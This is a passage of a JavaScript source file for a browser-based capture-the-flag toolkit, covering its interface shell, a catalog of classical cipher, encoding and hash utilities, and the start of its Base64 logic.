/* ==========================================================================
   CTF Arsenal — script.js
   Every tool below is a real, working implementation that runs entirely in
   the browser. No network calls are made by any tool; file inputs are read
   with the File/Canvas APIs only.
   ========================================================================== */

'use strict';

/* ---------------------------------------------------------------------- */
/* Small shared utilities                                                 */
/* ---------------------------------------------------------------------- */

function $(sel, root) { return (root || document).querySelector(sel); }
function $all(sel, root) { return Array.from((root || document).querySelectorAll(sel)); }

function escapeHtml(str) {
  return String(str).replace(/[&<>"']/g, function (c) {
    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
  });
}

function setOut(id, html) {
  const el = document.getElementById(id);
  if (el) el.innerHTML = html;
}

function setOutText(id, text) {
  const el = document.getElementById(id);
  if (el) el.textContent = text;
}

function toast(message, type) {
  const host = document.getElementById('toastHost');
  if (!host) return;
  const el = document.createElement('div');
  el.className = 'toast' + (type ? ' ' + type : '');
  el.textContent = message;
  host.appendChild(el);
  setTimeout(function () { el.remove(); }, 3200);
}

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
    toast('Copied to clipboard', 'ok');
  } catch (e) {
    toast('Could not copy — select and copy manually', 'err');
  }
}

function downloadBlob(filename, data, mime) {
  const blob = data instanceof Blob ? data : new Blob([data], { type: mime || 'application/octet-stream' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = filename;
  document.body.appendChild(a); a.click(); a.remove();
  setTimeout(function () { URL.revokeObjectURL(url); }, 2000);
}

function readFileAsArrayBuffer(file) {
  return new Promise(function (resolve, reject) {
    const r = new FileReader();
    r.onload = function () { resolve(r.result); };
    r.onerror = reject;
    r.readAsArrayBuffer(file);
  });
}

function readFileAsDataURL(file) {
  return new Promise(function (resolve, reject) {
    const r = new FileReader();
    r.onload = function () { resolve(r.result); };
    r.onerror = reject;
    r.readAsDataURL(file);
  });
}

function bytesToHex(bytes) {
  return Array.from(bytes).map(function (b) { return b.toString(16).padStart(2, '0'); }).join('');
}

function hexToBytesArr(hex) {
  const clean = hex.replace(/[^0-9a-fA-F]/g, '');
  const out = new Uint8Array(Math.floor(clean.length / 2));
  for (let i = 0; i < out.length; i++) out[i] = parseInt(clean.substr(i * 2, 2), 16);
  return out;
}

function bytesToAsciiPreview(bytes) {
  let s = '';
  for (let i = 0; i < bytes.length; i++) {
    const b = bytes[i];
    s += (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.';
  }
  return s;
}

function hexDump(bytes, maxBytes) {
  const limit = Math.min(bytes.length, maxBytes || 4096);
  let lines = [];
  for (let off = 0; off < limit; off += 16) {
    const chunk = bytes.slice(off, Math.min(off + 16, limit));
    const hex = Array.from(chunk).map(function (b) { return b.toString(16).padStart(2, '0'); }).join(' ').padEnd(47, ' ');
    lines.push(off.toString(16).padStart(8, '0') + '  ' + hex + '  ' + escapeHtml(bytesToAsciiPreview(chunk)));
  }
  let out = lines.join('\n');
  if (bytes.length > limit) out += '\n… (' + (bytes.length - limit) + ' more bytes, showing first ' + limit + ')';
  return out;
}

function calcShannonEntropy(bytes) {
  const freq = new Array(256).fill(0);
  for (let i = 0; i < bytes.length; i++) freq[bytes[i]]++;
  let entropy = 0;
  const len = bytes.length || 1;
  for (let i = 0; i < 256; i++) {
    if (!freq[i]) continue;
    const p = freq[i] / len;
    entropy -= p * Math.log2(p);
  }
  return entropy;
}

function wrapGroups(str, n) {
  const out = [];
  for (let i = 0; i < str.length; i += n) out.push(str.slice(i, i + n));
  return out.join(' ');
}

/* ---------------------------------------------------------------------- */
/* App shell: navigation, modal, command palette, session log, theme     */
/* ---------------------------------------------------------------------- */

const SESSION_LOG = [];

function activateSection(name) {
  $all('.view').forEach(function (v) { v.classList.toggle('active', v.id === name); });
  $all('.rail-link').forEach(function (l) { l.classList.toggle('active', l.dataset.section === name); });
  closeRailOnMobile();
}

function closeRailOnMobile() {
  if (window.innerWidth <= 920) { document.getElementById('rail').classList.remove('open'); document.getElementById('railScrim').classList.remove('show'); }
}

function initNav() {
  $all('.rail-link, .cat-tile').forEach(function (link) {
    link.addEventListener('click', function (e) {
      e.preventDefault();
      activateSection(link.dataset.section);
      history.replaceState(null, '', '#' + link.dataset.section);
    });
  });
  const initial = location.hash.replace('#', '') || 'dashboard';
  if (document.getElementById(initial)) activateSection(initial);

  const rail = document.getElementById('rail');
  const setRail = function (open) { rail.classList.toggle('open', open); document.getElementById('railScrim').classList.toggle('show', open); };
  document.getElementById('mobileMenu').addEventListener('click', function () { setRail(true); });
  document.getElementById('railScrim').addEventListener('click', function () { setRail(false); });
  document.getElementById('railToggle').addEventListener('click', function () { setRail(false); });
  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') setRail(false); });
}

function initThemeToggle() {
  const saved = (function () { try { return localStorage.getItem('ctfa-theme'); } catch (e) { return null; } })();
  if (saved === 'light') document.documentElement.setAttribute('data-theme', 'light');
  updateThemeLabel();
  document.getElementById('themeToggle').addEventListener('click', function () {
    const isLight = document.documentElement.getAttribute('data-theme') === 'light';
    if (isLight) document.documentElement.removeAttribute('data-theme');
    else document.documentElement.setAttribute('data-theme', 'light');
    try { localStorage.setItem('ctfa-theme', isLight ? 'dark' : 'light'); } catch (e) {}
    updateThemeLabel();
  });
}
function updateThemeLabel() {
  const isLight = document.documentElement.getAttribute('data-theme') === 'light';
  document.getElementById('themeToggleLabel').textContent = isLight ? 'Light console' : 'Dark console';
}

function logSessionUse(catCode, title, toolId) {
  const now = new Date();
  const time = now.toTimeString().slice(0, 8);
  SESSION_LOG.unshift({ time: time, catCode: catCode, title: title, toolId: toolId });
  renderSessionLog();
  const statUsed = document.getElementById('statUsed');
  if (statUsed) statUsed.textContent = String(SESSION_LOG.length);
}

function renderSessionLog() {
  const el = document.getElementById('sessionLog');
  if (!el) return;
  if (!SESSION_LOG.length) {
    el.innerHTML = '<li class="session-empty">Nothing opened yet. Try the search above, or pick a category.</li>';
    return;
  }
  el.innerHTML = SESSION_LOG.slice(0, 20).map(function (entry) {
    return '<li><span class="s-time">' + entry.time + '</span><span>' + escapeHtml(entry.catCode) + ' — ' + escapeHtml(entry.title) + '</span></li>';
  }).join('');
}

function computeDashboardStats() {
  const cards = $all('.tool-card');
  const statTools = document.getElementById('statTools');
  const statCats = document.getElementById('statCats');
  if (statTools) statTools.textContent = String(cards.length);
  if (statCats) statCats.textContent = String($all('.tool-grid').length);
  $all('[data-count-for]').forEach(function (el) {
    const grid = document.getElementById('grid-' + el.dataset.countFor);
    el.textContent = (grid ? grid.children.length : 0) + ' tools';
  });
}

/* ---------------------------------------------------------------------- */
/* Tool catalog: single source of truth for cards, search & palette      */
/* ---------------------------------------------------------------------- */

const TOOL_CATALOG = []; // filled by registerTool() calls below

function registerTool(category, catCode, code, id, title, desc) {
  TOOL_CATALOG.push({ category: category, catCode: catCode, code: code, id: id, title: title, desc: desc });
}

function renderToolGrids() {
  const byCat = {};
  TOOL_CATALOG.forEach(function (t) {
    (byCat[t.category] = byCat[t.category] || []).push(t);
  });
  Object.keys(byCat).forEach(function (cat) {
    const grid = document.getElementById('grid-' + cat);
    if (!grid) return;
    grid.innerHTML = byCat[cat].map(function (t) {
      return '<button class="tool-card" type="button" data-tool="' + t.id + '">' +
        '<span class="tc-code">' + t.code + '</span>' +
        '<h3>' + escapeHtml(t.title) + '</h3>' +
        '<p>' + escapeHtml(t.desc) + '</p>' +
        '</button>';
    }).join('');
  });
  $all('.tool-card').forEach(function (card) {
    card.addEventListener('click', function () { showTool(card.dataset.tool); });
  });
}

/* ---- search (hero + palette share this) ---- */
function searchTools(query) {
  const q = query.trim().toLowerCase();
  if (!q) return [];
  return TOOL_CATALOG.filter(function (t) {
    return t.title.toLowerCase().includes(q) || t.id.toLowerCase().includes(q) ||
      t.desc.toLowerCase().includes(q) || t.catCode.toLowerCase().includes(q) || t.code.toLowerCase().includes(q);
  }).slice(0, 40);
}

function renderResultList(listEl, results, onPick) {
  if (!results.length) {
    listEl.innerHTML = '<li class="hero-empty">No matching tool. Try a shorter word.</li>';
    return;
  }
  listEl.innerHTML = results.map(function (t, i) {
    return '<li><button type="button" class="hr-item' + (i === 0 ? ' is-active' : '') + '" data-tool="' + t.id + '">' +
      '<span class="hr-code">' + t.code + '</span><span>' + escapeHtml(t.title) + '</span>' +
      '<span class="hr-desc">' + escapeHtml(t.desc) + '</span></button></li>';
  }).join('');
  $all('.hr-item', listEl).forEach(function (btn) {
    btn.addEventListener('click', function () { onPick(btn.dataset.tool); });
  });
}

function initHeroSearch() {
  const input = document.getElementById('heroSearch');
  const list = document.getElementById('heroResults');
  input.addEventListener('input', function () {
    renderResultList(list, searchTools(input.value), function (id) { showTool(id); });
  });
  input.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
      const first = list.querySelector('.hr-item');
      if (first) showTool(first.dataset.tool);
    }
  });
}

function initPalette() {
  const overlay = document.getElementById('paletteOverlay');
  const input = document.getElementById('paletteInput');
  const list = document.getElementById('paletteResults');

  function open() {
    overlay.hidden = false;
    input.value = '';
    renderResultList(list, TOOL_CATALOG.slice(0, 12), pick);
    setTimeout(function () { input.focus(); }, 0);
  }
  function close() { overlay.hidden = true; }
  function pick(id) { close(); showTool(id); }

  document.getElementById('paletteTrigger').addEventListener('click', open);
  overlay.addEventListener('click', function (e) { if (e.target === overlay) close(); });
  input.addEventListener('input', function () {
    renderResultList(list, input.value.trim() ? searchTools(input.value) : TOOL_CATALOG.slice(0, 12), pick);
  });
  input.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') close();
    if (e.key === 'Enter') {
      const first = list.querySelector('.hr-item');
      if (first) pick(first.dataset.tool);
    }
  });
  document.addEventListener('keydown', function (e) {
    const meta = e.metaKey || e.ctrlKey;
    if (meta && e.key.toLowerCase() === 'k') { e.preventDefault(); overlay.hidden ? open() : close(); }
    if (e.key === 'Escape' && !overlay.hidden) close();
  });
}

/* ---------------------------------------------------------------------- */
/* Tool modal                                                              */
/* ---------------------------------------------------------------------- */

function showTool(id) {
  const meta = TOOL_CATALOG.find(function (t) { return t.id === id; });
  if (!meta) { toast('Unknown tool: ' + id, 'err'); return; }
  stopAnyRunningToolTimers(); // the modal body is about to be replaced/hidden — don't leak the old tool's interval
  const modal = document.getElementById('toolModal');
  document.getElementById('modalPath').textContent = meta.category + ' / ' + meta.code;
  document.getElementById('modalTitle').textContent = meta.title;
  document.getElementById('modalBody').innerHTML = getToolInterface(id);
  modal.hidden = false;
  document.body.style.overflow = 'hidden';
  logSessionUse(meta.code, meta.title, id);
  initializeTool(id);
  const firstField = modal.querySelector('textarea, input');
  if (firstField) setTimeout(function () { firstField.focus(); }, 30);
}

function closeModal() {
  stopAnyRunningToolTimers();
  document.getElementById('toolModal').hidden = true;
  document.body.style.overflow = '';
}

/* Stops the competition-timer's intervals whenever the modal is closed or swapped to a
   different tool, so they don't keep firing against a hidden/replaced DOM. Without this,
   swTick()'s own "element gone" cleanup cleared the interval but left TIMER_SW_RUNNING
   stuck at true, permanently disabling the Start button on reopen; and closeModal() never
   touched either interval at all, so both kept ticking indefinitely in the background. */
function stopAnyRunningToolTimers() {
  if (TIMER_COUNTDOWN_IV) { clearInterval(TIMER_COUNTDOWN_IV); TIMER_COUNTDOWN_IV = null; }
  if (TIMER_SW_RUNNING) {
    TIMER_SW_ELAPSED += Date.now() - TIMER_SW_START;
    TIMER_SW_RUNNING = false;
    clearInterval(TIMER_SW_IV);
  }
}

function initModal() {
  document.getElementById('modalClose').addEventListener('click', closeModal);
  document.getElementById('modalBackdrop').addEventListener('click', closeModal);
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape' && !document.getElementById('toolModal').hidden) closeModal();
  });
}

function initializeTool(toolName) {
  // Per-tool post-render hooks (timers, canvases, persisted state) attach here.
  if (TOOL_INIT_HOOKS[toolName]) TOOL_INIT_HOOKS[toolName]();
}
const TOOL_INIT_HOOKS = {};

/* ---------------------------------------------------------------------- */
/* Boot                                                                    */
/* ---------------------------------------------------------------------- */

function boot() {
  initNav();
  initModal();
  initThemeToggle();
  renderToolGrids();
  initHeroSearch();
  initPalette();
  computeDashboardStats();
  renderSessionLog();
}

document.addEventListener('DOMContentLoaded', boot);

/* ---------------------------------------------------------------------- */
/* CRYPTOGRAPHY — catalog                                                 */
/* ---------------------------------------------------------------------- */
registerTool('crypto', 'CRY', 'CRY-01', 'base64', 'Base64 Encoder / Decoder', 'Standard + URL-safe Base64, plus whole-file encoding.');
registerTool('crypto', 'CRY', 'CRY-02', 'url', 'URL Encoder / Decoder', 'Percent-encoding for query strings and paths.');
registerTool('crypto', 'CRY', 'CRY-03', 'hex', 'Hex Converter', 'Text ↔ hex, with raw byte breakdown.');
registerTool('crypto', 'CRY', 'CRY-04', 'ascii', 'ASCII Converter', 'Text ↔ decimal ASCII code lists.');
registerTool('crypto', 'CRY', 'CRY-05', 'binary', 'Binary Converter', 'Text ↔ binary, and decimal ↔ binary.');
registerTool('crypto', 'CRY', 'CRY-06', 'basex', 'Base32 / Base58 / Base85', 'Three more base encodings CTFs love to hide flags in.');
registerTool('crypto', 'CRY', 'CRY-07', 'caesar', 'Caesar Cipher', 'Shift cipher with encrypt, decrypt and full brute force.');
registerTool('crypto', 'CRY', 'CRY-08', 'vigenere', 'Vigenère Cipher', 'Polyalphabetic substitution with a repeating key.');
registerTool('crypto', 'CRY', 'CRY-09', 'vigenere-crack', 'Vigenère Cracker', 'Recovers key length (Kasiski-style) and key via frequency analysis.');
registerTool('crypto', 'CRY', 'CRY-10', 'atbash', 'Atbash Cipher', 'Mirror substitution: A↔Z, B↔Y…');
registerTool('crypto', 'CRY', 'CRY-11', 'rot13', 'ROT13', 'Fixed 13-position letter rotation.');
registerTool('crypto', 'CRY', 'CRY-12', 'railfence', 'Rail Fence Cipher', 'Zig-zag transposition over N rails.');
registerTool('crypto', 'CRY', 'CRY-13', 'affine', 'Affine Cipher', '(ax+b) mod 26 substitution with brute force.');
registerTool('crypto', 'CRY', 'CRY-14', 'substitution', 'Substitution Solver', 'Frequency analysis helper for monoalphabetic ciphers.');
registerTool('crypto', 'CRY', 'CRY-15', 'xor', 'XOR Cipher & Bruteforce', 'XOR with a key, plus single-byte key brute force with scoring.');
registerTool('crypto', 'CRY', 'CRY-16', 'morse', 'Morse Code', 'Text ↔ Morse, dot/dash or 0/1 style.');
registerTool('crypto', 'CRY', 'CRY-17', 'baconian', 'Baconian Cipher', "Francis Bacon's A/B binary-letter cipher.");
registerTool('crypto', 'CRY', 'CRY-18', 'freq', 'Frequency Analyzer', 'Letter, bigram and entropy statistics for cryptanalysis.');
registerTool('crypto', 'CRY', 'CRY-19', 'hash-identifier', 'Hash Identifier', 'Guesses hash algorithm(s) from length and character set.');
registerTool('crypto', 'CRY', 'CRY-20', 'hash-generator', 'Hash Generator', 'MD5, SHA-1, SHA-256, SHA-512, SHA3-256 of any text.');
registerTool('crypto', 'CRY', 'CRY-21', 'hash-cracker', 'Hash Cracker', 'Dictionary + brute-force cracking against MD5/SHA1/SHA256, done locally.');
registerTool('crypto', 'CRY', 'CRY-22', 'rainbow', 'Rainbow Table Lookup', 'Looks a hash up against a precomputed table of common passwords.');
registerTool('crypto', 'CRY', 'CRY-23', 'password-generator', 'Password Generator', 'Cryptographically random passwords with live strength scoring.');
registerTool('crypto', 'CRY', 'CRY-24', 'rsa-toy', 'RSA Toy Tool', 'Generate small RSA keypairs and encrypt/decrypt — for learning the math, not production keys.');

/* ---------------------------------------------------------------------- */
/* CRYPTOGRAPHY — interfaces                                              */
/* ---------------------------------------------------------------------- */
function ui_field(label, inner) {
  return '<div class="field"><label>' + label + '</label>' + inner + '</div>';
}
function ui_textarea(id, rows, placeholder) {
  return '<textarea id="' + id + '" rows="' + rows + '" placeholder="' + escapeHtml(placeholder || '') + '"></textarea>';
}
function ui_out(id) { return '<div id="' + id + '" class="out" role="status"></div>'; }
function ui_btns(buttons) {
  return '<div class="btn-row">' + buttons.map(function (b) {
    return '<button type="button" class="btn' + (b.primary ? ' primary' : '') + '" onclick="' + b.onclick + '">' + escapeHtml(b.label) + '</button>';
  }).join('') + '</div>';
}
function ui_copyBtn(outId) {
  return '<button type="button" class="btn ghost" onclick="copyText(document.getElementById(\'' + outId + '\').textContent)"><i class="fas fa-copy"></i> Copy output</button>';
}

const CRYPTO_INTERFACES = {
  base64: function () {
    return ui_field('Input text or data', ui_textarea('base64Input', 6, 'Enter text to encode, or Base64 to decode')) +
      ui_btns([
        { label: 'Encode', onclick: 'base64Encode()' },
        { label: 'Decode', onclick: 'base64Decode()', primary: true },
        { label: 'URL-safe encode', onclick: 'base64UrlEncode()' },
        { label: 'URL-safe decode', onclick: 'base64UrlDecode()' },
        { label: 'Clear', onclick: "clearIO('base64Input','base64Output')" }
      ]) +
      ui_field('Output', ui_out('base64Output')) + ui_copyBtn('base64Output') +
      ui_field('Encode a file', '<input type="file" id="base64File">' +
        ui_btns([{ label: 'Encode file to Base64', onclick: 'base64EncodeFile()' }, { label: 'Decode output to file download', onclick: 'base64DownloadDecoded()' }]));
  },
  url: function () {
    return ui_field('Input', ui_textarea('urlInput', 5, 'Text to encode, or %-encoded text to decode')) +
      ui_btns([
        { label: 'Encode', onclick: 'urlEncodeTool()', primary: true },
        { label: 'Decode', onclick: 'urlDecodeTool()' },
        { label: 'Clear', onclick: "clearIO('urlInput','urlOutput')" }
      ]) + ui_field('Output', ui_out('urlOutput')) + ui_copyBtn('urlOutput');
  },
  hex: function () {
    return ui_field('Input', ui_textarea('hexInput', 5, 'Text, or hex bytes like 48 65 6c 6c 6f')) +
      ui_btns([
        { label: 'Text → Hex', onclick: 'textToHexTool()', primary: true },
        { label: 'Hex → Text', onclick: 'hexToTextTool()' },
        { label: 'Hex → Decimal bytes', onclick: 'hexToBytesTool()' },
        { label: 'Clear', onclick: "clearIO('hexInput','hexOutput')" }
      ]) + ui_field('Output', ui_out('hexOutput')) + ui_copyBtn('hexOutput');
  },
  ascii: function () {
    return ui_field('Input', ui_textarea('asciiInput', 5, 'Text, or space-separated ASCII codes like 72 101 108 108 111')) +
      ui_btns([
        { label: 'Text → ASCII codes', onclick: 'textToAsciiTool()', primary: true },
        { label: 'ASCII codes → Text', onclick: 'asciiToTextTool()' },
        { label: 'Clear', onclick: "clearIO('asciiInput','asciiOutput')" }
      ]) + ui_field('Output', ui_out('asciiOutput')) + ui_copyBtn('asciiOutput');
  },
  binary: function () {
    return ui_field('Input', ui_textarea('binaryInput', 5, 'Text, binary (01001000…), or a decimal number')) +
      ui_btns([
        { label: 'Text → Binary', onclick: 'textToBinaryTool()', primary: true },
        { label: 'Binary → Text', onclick: 'binaryToTextTool()' },
        { label: 'Decimal → Binary', onclick: 'decimalToBinaryTool()' },
        { label: 'Clear', onclick: "clearIO('binaryInput','binaryOutput')" }
      ]) + ui_field('Output', ui_out('binaryOutput')) + ui_copyBtn('binaryOutput');
  },
  basex: function () {
    return ui_field('Input', ui_textarea('basexInput', 5, 'Text to encode, or encoded string to decode')) +
      '<div class="field"><label>Encoding</label><select id="basexMode"><option value="32">Base32 (RFC 4648)</option><option value="58">Base58 (Bitcoin alphabet)</option><option value="85">Base85 (Ascii85)</option></select></div>' +
      ui_btns([
        { label: 'Encode', onclick: 'basexEncode()', primary: true },
        { label: 'Decode', onclick: 'basexDecode()' },
        { label: 'Clear', onclick: "clearIO('basexInput','basexOutput')" }
      ]) + ui_field('Output', ui_out('basexOutput')) + ui_copyBtn('basexOutput');
  },
  caesar: function () {
    return ui_field('Input text', ui_textarea('caesarInput', 4, 'Enter text to encrypt or decrypt')) +
      ui_field('Shift (0–25)', '<input type="number" id="caesarShift" min="0" max="25" value="13">') +
      ui_btns([
        { label: 'Encrypt', onclick: 'caesarEncryptTool()', primary: true },
        { label: 'Decrypt', onclick: 'caesarDecryptTool()' },
        { label: 'Brute force all 26 shifts', onclick: 'caesarBruteTool()' },
        { label: 'Clear', onclick: "clearIO('caesarInput','caesarOutput')" }
      ]) + ui_field('Output', ui_out('caesarOutput'));
  },
  vigenere: function () {
    return ui_field('Input text', ui_textarea('vigenereInput', 4, 'Enter text')) +
      ui_field('Key', '<input type="text" id="vigenereKey" placeholder="e.g. FLAG">') +
      ui_btns([
        { label: 'Encrypt', onclick: 'vigenereEncryptTool()', primary: true },
        { label: 'Decrypt', onclick: 'vigenereDecryptTool()' },
        { label: 'Clear', onclick: "clearIO('vigenereInput','vigenereOutput')" }
      ]) + ui_field('Output', ui_out('vigenereOutput'));
  },
  'vigenere-crack': function () {
    return ui_field('Ciphertext', ui_textarea('vcrackInput', 5, 'Paste Vigenère ciphertext (the more text, the better the guess)')) +
      ui_field('Max key length to try', '<input type="number" id="vcrackMaxLen" min="2" max="20" value="12">') +
      ui_btns([{ label: 'Recover key & plaintext', onclick: 'vigenereCrackTool()', primary: true }, { label: 'Clear', onclick: "clearIO('vcrackInput','vcrackOutput')" }]) +
      ui_field('Analysis', ui_out('vcrackOutput'));
  },
  atbash: function () {
    return ui_field('Input text', ui_textarea('atbashInput', 4, 'Enter text')) +
      ui_btns([{ label: 'Transform', onclick: 'atbashTool()', primary: true }, { label: 'Clear', onclick: "clearIO('atbashInput','atbashOutput')" }]) +
      ui_field('Output', ui_out('atbashOutput')) +
      '<div class="hint">Atbash is its own inverse — running it twice returns the original text.</div>';
  },
  rot13: function () {
    return ui_field('Input text', ui_textarea('rot13Input', 4, 'Enter text')) +
      ui_btns([{ label: 'Rotate', onclick: 'rot13Tool()', primary: true }, { label: 'Clear', onclick: "clearIO('rot13Input','rot13Output')" }]) +
      ui_field('Output', ui_out('rot13Output'));
  },
  railfence: function () {
    return ui_field('Input text', ui_textarea('railInput', 4, 'Enter text')) +
      ui_field('Number of rails', '<input type="number" id="railCount" min="2" max="20" value="3">') +
      ui_btns([
        { label: 'Encrypt', onclick: 'railEncryptTool()', primary: true },
        { label: 'Decrypt', onclick: 'railDecryptTool()' },
        { label: 'Clear', onclick: "clearIO('railInput','railOutput')" }
      ]) + ui_field('Output', ui_out('railOutput'));
  },
  affine: function () {
    return ui_field('Input text', ui_textarea('affineInput', 4, 'Enter text')) +
      '<div class="row2">' + ui_field('a (must be coprime with 26)', '<input type="number" id="affineA" value="5">') +
      ui_field('b', '<input type="number" id="affineB" value="8">') + '</div>' +
      ui_btns([
        { label: 'Encrypt', onclick: 'affineEncryptTool()', primary: true },
        { label: 'Decrypt', onclick: 'affineDecryptTool()' },
        { label: 'Brute force all valid a,b', onclick: 'affineBruteTool()' },
        { label: 'Clear', onclick: "clearIO('affineInput','affineOutput')" }
      ]) + ui_field('Output', ui_out('affineOutput'));
  },
  substitution: function () {
    return ui_field('Ciphertext', ui_textarea('subInput', 5, 'Paste monoalphabetic substitution ciphertext')) +
      ui_btns([{ label: 'Run frequency analysis', onclick: 'substitutionAnalyzeTool()', primary: true }]) +
      ui_field('Letter frequency vs. English', ui_out('subFreqOutput')) +
      ui_field('Your working substitution (type 26 letters, A→Z order, blank = unknown)', '<input type="text" id="subKey" maxlength="26" placeholder="e.g. QWERTYUIOPASDFGHJKLZXCVBNM">') +
      ui_btns([{ label: 'Apply substitution', onclick: 'substitutionApplyTool()' }, { label: 'Clear', onclick: "clearIO('subInput','subOutput')" }]) +
      ui_field('Decoded attempt', ui_out('subOutput'));
  },
  xor: function () {
    return ui_field('Input (hex bytes, e.g. from a challenge dump)', ui_textarea('xorInput', 4, '4869212074686973206973206374662121')) +
      ui_field('Key (text — leave blank to brute-force single byte)', '<input type="text" id="xorKey" placeholder="e.g. key">') +
      ui_btns([
        { label: 'XOR with key', onclick: 'xorApplyTool()', primary: true },
        { label: 'Brute-force single-byte key', onclick: 'xorBruteTool()' },
        { label: 'Clear', onclick: "clearIO('xorInput','xorOutput')" }
      ]) + ui_field('Output', ui_out('xorOutput'));
  },
  morse: function () {
    return ui_field('Input', ui_textarea('morseInput', 4, 'Text, or Morse like .... . .-.. .-..')) +
      ui_btns([
        { label: 'Text → Morse', onclick: 'textToMorseTool()', primary: true },
        { label: 'Morse → Text', onclick: 'morseToTextTool()' },
        { label: 'Clear', onclick: "clearIO('morseInput','morseOutput')" }
      ]) + ui_field('Output', ui_out('morseOutput'));
  },
  baconian: function () {
    return ui_field('Input', ui_textarea('baconInput', 4, 'Text, or Baconian code (AABAB BBBAA …)')) +
      ui_btns([
        { label: 'Text → Baconian', onclick: 'textToBaconTool()', primary: true },
        { label: 'Baconian → Text', onclick: 'baconToTextTool()' },
        { label: 'Clear', onclick: "clearIO('baconInput','baconOutput')" }
      ]) + ui_field('Output', ui_out('baconOutput'));
  },
  freq: function () {
    return ui_field('Text to analyze', ui_textarea('freqInput', 6, 'Paste any text or ciphertext')) +
      ui_btns([{ label: 'Analyze', onclick: 'freqAnalyzeTool()', primary: true }]) +
      ui_field('Results', ui_out('freqOutput'));
  },
  'hash-identifier': function () {
    return ui_field('Hash', ui_textarea('hashIdInput', 3, 'Paste a hash to identify')) +
      ui_btns([{ label: 'Identify', onclick: 'identifyHashTool()', primary: true }]) +
      ui_field('Result', ui_out('hashIdOutput'));
  },
  'hash-generator': function () {
    return ui_field('Input text', ui_textarea('hashGenInput', 4, 'Text to hash')) +
      ui_btns([{ label: 'Generate hashes', onclick: 'hashGenTool()', primary: true }]) +
      ui_field('Results', ui_out('hashGenOutput'));
  },
  'hash-cracker': function () {
    return ui_field('Hash to crack', '<input type="text" id="crackHash" placeholder="Paste MD5 / SHA-1 / SHA-256 hash">') +
      '<div class="field"><label>Algorithm</label><select id="crackAlgo"><option value="MD5">MD5</option><option value="SHA1">SHA-1</option><option value="SHA256">SHA-256</option></select></div>' +
      ui_field('Wordlist (one candidate per line — leave blank to use the built-in common-password list)', ui_textarea('crackWordlist', 4, '')) +
      ui_btns([
        { label: 'Dictionary attack', onclick: 'hashCrackDictTool()', primary: true },
        { label: 'Brute force (lowercase, ≤4 chars)', onclick: 'hashCrackBruteTool()' }
      ]) + ui_field('Result', ui_out('crackOutput'));
  },
  rainbow: function () {
    return ui_field('Hash to look up', '<input type="text" id="rainbowHash" placeholder="Paste a hash">') +
      '<div class="field"><label>Algorithm</label><select id="rainbowAlgo"><option value="MD5">MD5</option><option value="SHA1">SHA-1</option><option value="SHA256">SHA-256</option></select></div>' +
      ui_btns([{ label: 'Look up', onclick: 'rainbowLookupTool()', primary: true }]) +
      ui_field('Result', ui_out('rainbowOutput')) +
      '<div class="hint">Table covers ' + COMMON_PASSWORDS.length + ' of the most common leaked passwords, hashed on the fly — a real (if small) rainbow table, not a lookup service.</div>';
  },
  'password-generator': function () {
    return '<div class="row2">' + ui_field('Length', '<input type="number" id="passLen" value="16" min="4" max="128">') +
      ui_field('How many', '<input type="number" id="passCount" value="5" min="1" max="50">') + '</div>' +
      '<div class="checks">' +
      '<label><input type="checkbox" id="passUpper" checked> Uppercase A-Z</label>' +
      '<label><input type="checkbox" id="passLower" checked> Lowercase a-z</label>' +
      '<label><input type="checkbox" id="passNum" checked> Numbers 0-9</label>' +
      '<label><input type="checkbox" id="passSym" checked> Symbols !@#$…</label>' +
      '<label><input type="checkbox" id="passNoAmbig"> Exclude ambiguous (0 O l 1 I)</label></div>' +
      ui_btns([{ label: 'Generate', onclick: 'generatePasswordsTool()', primary: true }]) +
      ui_field('Generated', ui_out('passOutput')) +
      ui_field('Check your own password', '<input type="text" id="passCheck" placeholder="Type a password to score it">') +
      ui_btns([{ label: 'Score strength', onclick: 'checkPasswordTool()' }]) + ui_field('Strength', ui_out('passStrengthOutput'));
  },
  'rsa-toy': function () {
    return ui_field('Key size (bits — small on purpose, for teaching the math)', '<select id="rsaBits"><option value="16">16-bit</option><option value="24">24-bit</option><option value="32" selected>32-bit</option><option value="48">48-bit</option></select>') +
      ui_btns([{ label: 'Generate keypair', onclick: 'rsaGenTool()', primary: true }]) +
      ui_field('Keys', ui_out('rsaKeyOutput')) +
      '<div class="row2">' + ui_field('Message (small integer, less than n)', '<input type="text" id="rsaMsg" placeholder="e.g. 42">') +
      ui_field('Ciphertext', '<input type="text" id="rsaCt" placeholder="computed or pasted">') + '</div>' +
      ui_btns([{ label: 'Encrypt message → ciphertext', onclick: 'rsaEncryptTool()' }, { label: 'Decrypt ciphertext → message', onclick: 'rsaDecryptTool()' }]) +
      ui_field('Result', ui_out('rsaOutput')) +
      '<div class="hint warn"><strong>Teaching tool only.</strong> Keys this small are breakable instantly and must never protect anything real.</div>';
  }
};

function clearIO(inId, outId) {
  const inEl = document.getElementById(inId);
  if (inEl) inEl.value = '';
  setOutText(outId, '');
}

/* ---------------------------------------------------------------------- */
/* CRYPTOGRAPHY — logic                                                   */
/* ---------------------------------------------------------------------- */

function base64Encode() {
  const v = document.getElementById('base64Input').value;
  try { setOutText('base64Output', btoa(unescape(encodeURIComponent(v)))); }
  catch (e) { setOutText('base64Output', 'Error: ' + e.message); }
}
function base64Decode() {
  const v = document.getElementById('base64Input').value.trim();
  try { setOutText('base64Output', decodeURIComponent(escape(atob(v)))); }
  catch (e) { setOutText('base64Output', 'Not valid Base64: ' + e.message); }
}
function base64UrlEncode() {
  const v = document.getElementById('base64Input').value;
  try { setOutText('base64Output', btoa(unescape(encodeURIComponent(v))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')); }
  catch (e) { setOutText('base64Output', 'Error: ' + e.message); }
}
function base64UrlDecode() {
  let v = document.getElementById('base64Input').value.trim().replace(/-/g, '+').replace(/_/g, '/');
  while (v.length % 4) v += '=';
  try { setOutText('base64Output', decodeURIComponent(escape(atob(v)))); }
  catch (e) { setOutText('base64Output', 'Not valid Base64: ' + e.message); }
}
async function base64EncodeFile() {
  const f = document.getElementById('base64File').files[0];
  if (!f) { toast('Choose a file first', 'err'); return; }
  const buf = await readFileAsArrayBuffer(f);
